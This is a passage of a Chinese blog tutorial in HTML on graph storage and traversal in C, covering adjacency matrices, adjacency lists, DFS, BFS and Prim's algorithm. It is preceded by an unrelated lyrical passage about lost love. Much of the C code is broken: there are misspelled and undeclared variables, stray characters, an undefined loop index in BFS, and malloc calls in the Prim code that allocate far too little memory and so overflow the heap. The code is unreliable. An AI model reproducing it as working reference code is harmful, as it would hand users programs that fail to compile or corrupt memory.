2}$</p><p>你开始小心翼翼的避开我，像极了曾经的自己，而我能做的只是远远的望着你，其实我也很想主动靠近你，但最后还是把耐心都给了你，时间过了很久你还是不为所动，好像根本就没有意识到我的存在，我开始有些失落，想着是否能够离你近一点，可你那过分的敏感，让我愣在原地有些不知所措，脑海里出现过很多不同的场景，可能是压抑了太久，我觉得自己已经很卑微了，但对于你来说，不知道这是错过还是解脱。但其实说来也好笑，自己又何尝不是和你一样呢。你还是不肯面对我，即使你已经走到了我的面前，你真的已经缺席了太多我需要你的时刻，你曾经那模糊的好感，让我心动很久，可现在，我已经没有再等下去的勇气了，我的心，已经开始乱了。不甘心于舍不得，只会让我们的距离越来越大，原来我始终都是个局外人，这绵延的城市应有尽有，却唯独没有你，也没有尽头，只有我的存在，始终都是违和的，有些事到此为止，就是最好的收场，不是想通了，是算了，就连你唯一一次朝着我走来，也只不过是给了我一场空欢喜，若不是失望到极致，又怎会，两眼无悲喜，你给我的遗憾虽然很多很多，但最后离开的你，也陪我度过了很久很久</p><h2 id="图的存储表示"><a href="#图的存储表示" class="headerlink" title="图的存储表示"></a>图的存储表示</h2><h3 id="邻接矩阵表示法"><a href="#邻接矩阵表示法" class="headerlink" title="邻接矩阵表示法"></a>邻接矩阵表示法</h3><p>举例：</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201216201328.png"></p><ul><li>邻接矩阵图的类型定义</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">GRAPHMATRIX_STRU</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> size;<span class="comment">//图中结点的个数</span></span><br><span class="line">    <span class="type">int</span> **graph;<span class="comment">//二维数组保存图</span></span><br><span class="line">&#125;GraphMatrix;</span><br></pre></td></tr></table></figure><ul><li>初始化图（邻接矩阵）</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">GraphMatrix* <span class="title function_">InitGraph</span><span class="params">(<span class="type">int</span> num)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    GraphMatrix* graphMatrix = (GraphMatrix*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(GraphMatrix));</span><br><span class="line">    graphMatrix-&gt;size = num;<span class="comment">//图中结点个数</span></span><br><span class="line">    <span class="comment">//给图分配空间</span></span><br><span class="line">    graphMatrix-&gt;graph = (<span class="type">int</span>**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>*)*graphMatrix-&gt;size);</span><br><span class="line">    <span class="keyword">for</span>(i=o;i&lt;graphMatrix-&gt;size;i++)</span><br><span class="line">        graphMatrix-&gt;graph[i]=(<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*graphMatrix-&gt;size);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphMatrix-&gt;size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;graphMatrix-&gt;size;j++)</span><br><span class="line">            graphMatrix-&gt;graph[i][j] = INT_MAX;<span class="comment">//初始设置所有顶点不邻接</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> graphMatrix;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>为什么要申请两次空间？</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201216230949.png"></p><ul><li>输入邻接矩阵图算法：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ReadGraph</span><span class="params">(GraphMatrix* graphMatrix)</span><span class="comment">//输入边信息构建图</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> vex1,vex2,weight;</span><br><span class="line">    <span class="comment">//输入方式是点 点 权值，权值为0，则输入结束</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入，输入方式为点 点 权值，权值为0，则输入结束\n&quot;</span>);</span><br><span class="line">    scanf_s(<span class="string">&quot;%d%d%d&quot;</span>,&amp;vex1,&amp;vex2,&amp;weight);</span><br><span class="line">    <span class="keyword">while</span>(weight!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        graphMatrix-&gt;graph[vex1][vex2] = weight;</span><br><span class="line">        scanf_s(<span class="string">&quot;%d%d%d&quot;</span>,&amp;vex1,&amp;vex2,&amp;weight);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="邻接表表示法"><a href="#邻接表表示法" class="headerlink" title="邻接表表示法"></a>邻接表表示法</h3><p>举例：</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201216202227.png"></p><ul><li>容易确定图的顶点数和判断一个顶点与哪几个顶点是否有边相连</li><li>容易确定图的顶点的度，即顶点对应顺序表的链表链接的结点个数</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201216204631.png"></p><ul><li>邻接表图的类型定义</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">GRAPHLISTNODE_STRU</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> nodeno;<span class="comment">//图中结点编号</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">GRAPHLISTNODE_STRU</span>* <span class="title">next</span>;</span><span class="comment">//指向下一个结点的指针</span></span><br><span class="line">&#125;GraphListNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">GRAPHLIST_STRU</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> size;<span class="comment">//图中结点个数</span></span><br><span class="line">    GraphListNode* graphListArray;<span class="comment">//图的邻接表，用二维数组表示</span></span><br><span class="line">&#125;GraphList;</span><br></pre></td></tr></table></figure><ul><li>初始化图（邻接表）</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GraphList* <span class="title function_">IniGraph</span><span class="params">(<span class="type">int</span> num)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    GraphList *grahList = (GraphList*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(GraphList));</span><br><span class="line">    grapList-&gt;size = num;</span><br><span class="line">    graphList-&gt;graphListArray = (GraphListNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(GraphListNode)*num);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;num;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        graphList-&gt;graphListArray[i].next = <span class="literal">NULL</span>;</span><br><span class="line">        graphList-&gt;graphListArray[i].nodeno = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> grapList;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>输入邻接矩阵图算法：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ReadGraph</span><span class="params">(GraphList* graphList)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> vex1,vex2;</span><br><span class="line">    GraphListNode *tempNode = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//输入方式为点 点，点为-1，则输入结束</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入，输入方式为点 点，点为-1，则输入结束\n&quot;</span>);</span><br><span class="line">    scanf_s(<span class="string">&quot;%d%d&quot;</span>,&amp;vex1,&amp;vex2);</span><br><span class="line">    <span class="keyword">while</span>(vex1&gt;=<span class="number">0</span> &amp;&amp; vex2&gt;=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        tempNode = (GraphListNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(GraphListNode));</span><br><span class="line">        tempNode-&gt;nodeno = vex2;</span><br><span class="line">        tempNode-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="comment">//头插法插入结点</span></span><br><span class="line">        tempNode-&gt;next = graphList-&gt;graphListArray[vex1].next;</span><br><span class="line">        graphList-&gt;graphListArray[vex1].next = tempNode;</span><br><span class="line">        scanf_s(<span class="string">&quot;%d%d&quot;</span>,&amp;vex1,&amp;vex2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="邻接多重表表示法"><a href="#邻接多重表表示法" class="headerlink" title="邻接多重表表示法"></a>邻接多重表表示法</h3><h3 id="图的十字链表"><a href="#图的十字链表" class="headerlink" title="图的十字链表"></a>图的十字链表</h3><blockquote><p>以后有空补上</p></blockquote><h2 id="图的周游"><a href="#图的周游" class="headerlink" title="图的周游"></a>图的周游</h2><ul><li>遍历每个顶点，不重复</li></ul><h3 id="深度优先搜索（DFS）"><a href="#深度优先搜索（DFS）" class="headerlink" title="深度优先搜索（DFS）"></a>深度优先搜索（DFS）</h3><ul><li>指定顶点<code>v</code>出发，先访问顶点<code>v</code>，并<code>将其标记</code></li><li>如果存在与<code>v</code>邻接顶点没被访问过，则选择其中的一个<code>w</code>出发进行<code>DFS(w)</code></li><li>否则，返回</li><li><code>如果图中有未被访问的顶点，则从另一未被访问的顶点出发重复上述过程，直到遍历全部顶点</code></li><li>邻接矩阵 DFS 算法实现：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DFSGraphMatrix</span><span class="params">(GraphMatrix * graphMatrix)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;<span class="comment">//用于记录图中结点哪些被访问了</span></span><br><span class="line">    <span class="type">int</span> *visited = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)* graphMatrix-&gt;size);</span><br><span class="line">    <span class="comment">//初始化所有点都未被访问</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphMatrix-&gt;size;i++)</span><br><span class="line">        visited[i] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphMatrix-&gt;size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[i])</span><br><span class="line">            DFS(graphMatrix, visite, i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(GraphMatrix* graphMatrix,<span class="type">int</span> *visited,<span class="type">int</span> source)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    visited[source] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;graphMatrix-&gt;size;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(graphMatrix-&gt;graph[source][j] != INT_MAX &amp;&amp; !visited[j])</span><br><span class="line">            DFS(graphMatrix,visited,j);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>邻接表 DFS 算法实现：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DFSGraphMatrix</span><span class="params">(GraphList * graphList)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;<span class="comment">//用于记录图中结点哪些被访问了</span></span><br><span class="line">    <span class="type">int</span> *visited = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)* graphList-&gt;size);</span><br><span class="line">    <span class="comment">//初始化所有点都未被访问</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphList-&gt;size;i++)</span><br><span class="line">        visited[i] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphList-&gt;size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[i])</span><br><span class="line">            DFS(graphList, visite, i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(GraphLIst* graphList, <span class="type">int</span>* visited,<span class="type">int</span> source)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    GraphList弄得*tempnode = <span class="literal">NULL</span>;</span><br><span class="line">    visited[source] = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,source);</span><br><span class="line">    tempNode = graphList-&gt;graphListArray[source].next;</span><br><span class="line">    <span class="keyword">while</span>(tempNode != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[tempNode-&gt;nodeno])</span><br><span class="line">            DFS(graphList,visited,tempNode-&gt;nodeno);</span><br><span class="line">        tempNode = tempNode-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="广度优先搜索（BFS）"><a href="#广度优先搜索（BFS）" class="headerlink" title="广度优先搜索（BFS）"></a>广度优先搜索（BFS）</h3><ul><li>指定顶点<code>v</code>出发，先访问顶点<code>v</code>，并<code>将其标记</code></li><li>依次访问<code>v</code>的所有相邻结点</li><li>再依次访问与相邻结点邻接的所有没被访问过的顶点</li><li>直到所有已访问顶点的相邻结点都被访问过为止</li><li><code>如果图中有未被访问的顶点，则从另一未被访问的顶点出发重复上述过程，直到遍历全部顶点</code></li><li>邻接矩阵 BFS 算法实现：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">BFSGraphMatrix</span><span class="params">(GraphMatrix * graphList)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;<span class="comment">//用于记录图中结点哪些被访问了</span></span><br><span class="line">    <span class="type">int</span> *visited = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)* graphList-&gt;size);</span><br><span class="line">    <span class="comment">//初始化所有点都未被访问</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphList-&gt;size;i++)</span><br><span class="line">        visited[i] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphList-&gt;size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[i])</span><br><span class="line">            BFS(graphList, visite, i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">BFS</span><span class="params">(GraphMatrix* graphMatrix,<span class="type">int</span>*visited,<span class="type">int</span> source)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> j,tempVex;</span><br><span class="line">    LinkQueue waitingQueue = <span class="literal">NULL</span>;</span><br><span class="line">    waitingQueue = SetNullQueue_Link();</span><br><span class="line"><span class="keyword">if</span>(!visited[i])<span class="comment">//如果没被访问过</span></span><br><span class="line">    &#123;</span><br><span class="line">        visited[i] = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,i);</span><br><span class="line">        EnQueue_link(waitingQueue,i);<span class="comment">//将刚访问结点放入队列</span></span><br><span class="line">        <span class="keyword">while</span>(!IsNullQueue_Link(waitingQueue))</span><br><span class="line">        &#123;</span><br><span class="line">            tempVex = FrontQueue_link(waitingQueue);</span><br><span class="line">            DeQueue_link(waitingQueue);</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;graphMatrix-&gt;size;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//如果其他顶点与当前顶点存在边且未访问过</span></span><br><span class="line">                <span class="keyword">if</span>(graphMatrix-&gt;graph[tempVex][j] != INT_MAX &amp;&amp; !visited[j])</span><br><span class="line">                &#123;</span><br><span class="line">                    visited[j] = source;<span class="comment">//标记</span></span><br><span class="line">                    EnQueue_link(waitingQueue,j);<span class="comment">//入队</span></span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,j);<span class="comment">//输出</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>邻接表 BFS 算法实现</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">BFSGraphMatrix</span><span class="params">(GraphList * graphList)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;<span class="comment">//用于记录图中结点哪些被访问了</span></span><br><span class="line">    <span class="type">int</span> *visited = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)* graphList-&gt;size);</span><br><span class="line">    <span class="comment">//初始化所有点都未被访问</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphList-&gt;size;i++)</span><br><span class="line">        visited[i] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphList-&gt;size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[i])</span><br><span class="line">            DFS(graphList, visite, i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">BFS</span><span class="params">(GraphList* graphList,<span class="type">int</span>* visited,<span class="type">int</span> source)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> tempVex;</span><br><span class="line">    GraphListNode *tempNode = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">queue</span>&lt;<span class="type">int</span>&gt; waitingQueue;<span class="comment">//广度优先遍历使用的队列是c++的STL中的queue</span></span><br><span class="line">    <span class="keyword">if</span>(!visited[source])</span><br><span class="line">    &#123;</span><br><span class="line">        visited[source] = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,source);</span><br><span class="line">        waitingQueue.push(source);<span class="comment">//刚刚访问结点放入队列</span></span><br><span class="line">        <span class="keyword">while</span>(!waitingQueue.empty())</span><br><span class="line">        &#123;</span><br><span class="line">            tempVex = waitingQueue.front();</span><br><span class="line">            waitingQueue.pop();</span><br><span class="line">            tempNode = graphList-&gt;graphListArray[tempVex].next;</span><br><span class="line">            <span class="keyword">while</span>(tempNode != <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(!visited[tempNode-&gt;nodeno])</span><br><span class="line">                &#123;</span><br><span class="line">                    visited[tempNode-&gt;nodeno] = <span class="number">1</span>;</span><br><span class="line">                    waitingQueue.push(tempNode-&gt;nodeno);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,tempNode-&gt;nodeno);</span><br><span class="line">                &#125;</span><br><span class="line">                tempNode = tempNode-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="最小生成树（MST）"><a href="#最小生成树（MST）" class="headerlink" title="最小生成树（MST）"></a>最小生成树（MST）</h2><h3 id="Prim算法"><a href="#Prim算法" class="headerlink" title="Prim算法"></a>Prim算法</h3><ul><li><p>算法思路：每次选择一条权值最小的边及其相应的顶点加入最小生成树，顶点不能重复选用，直到最小生成树中有 <code>n-1</code> 条边为止</p></li><li><p><code>component[j]</code>用来记录已加入最小生成树的顶点 <code>j</code>，初始化<code>component[j] = 0</code>，当顶点<code>j</code>加入最小生成树后，设置<code>component[j] = 1</code></p></li><li><p><code>distance[j]</code>用来记录代价最小的边的权值，初始化<code>distance[j] = garphMatrix-&gt;graph[0][j]</code></p></li><li><p><code>neighbor[j]</code>用来记录代价最小的边对应的顶点，初始化<code>neighbor[j] = 0</code></p></li><li><p>算法实现：</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">GraphMatrix* <span class="title function_">prim</span><span class="params">(GraphMatrix *graphMatrix,<span class="type">int</span> source)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="type">int</span> *component = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(graphMatrix-&gt;size));<span class="comment">//新点集合</span></span><br><span class="line">    <span class="type">int</span> *diftance = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(graphMatrix-&gt;size));<span class="comment">//距离</span></span><br><span class="line">    <span class="comment">//邻居，例如 neighbor[j] = 1 表示 j 的邻居是 1</span></span><br><span class="line">    <span class="type">int</span> *neighbor = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(graphMatrix-&gt;size));</span><br><span class="line">    GraphMatrix *tree = IniGraph(graphMatrix-&gt;size);<span class="comment">//存放结果的图</span></span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;graphMatrix-&gt;size;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        component[j] = <span class="number">0</span>;</span><br><span class="line">        distance[j] = graphMatrix-&gt;graph[source][j];</span><br><span class="line">        neighbor[j] = source;</span><br><span class="line">    &#125;<span class="comment">//end 9</span></span><br><span class="line">    component[source] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;graphMatrix-&gt;size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> v;</span><br><span class="line">        <span class="type">int</span> min = MAX;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;graphMatrix-&gt;size;j++)<span class="comment">//选择不是新点集合中的距离新点集合最短的那个点</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>（!component[j] &amp;&amp; (distance[j]&lt;min))</span><br><span class="line">            &#123;</span><br><span class="line">                v = j;</span><br><span class="line">                min = distance[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="comment">//end 20</span></span><br><span class="line">        <span class="keyword">if</span>(min&lt;MAX)</span><br><span class="line">        &#123;</span><br><span class="line">            component[v] = <span class="number">1</span>;</span><br><span class="line">            tree-&gt;graph[v][neighbor[v]] = distance[v];</span><br><span class="line">            tree-&gt;graph[neighbor[v]][v] = distance[v];</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;graphMatrix-&gt;size;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(!component[j] &amp;&amp; (graphMatrix-&gt;graph[v][j]&lt;distance[j]))</span><br><span class="line">                &#123;</span><br><span class="line">                    distance[j] = graphMatrix-&gt;graph[v][j];</span><br><span class="line">                    neighbor[j] = v;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="comment">//end 34</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">    &#125;<span class="comment">//end 16</span></span><br><span class="line">    <span class="keyword">return</span> tree;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Kruskai算法"><a href="#Kruskai算法" class="headerlink" title="Kruskai算法"></a>Kruskai算法</h3><ul><li>算法思路：先把所有顶点加入最小生成树，然后选择合适的边构建最小生成树，边的权值最小且两个点要属于两个不同的连通分量，直到最小生成树中有 <code>n-1 </code>条边为止</li></ul><figure class="highlight c"><table><tr><td 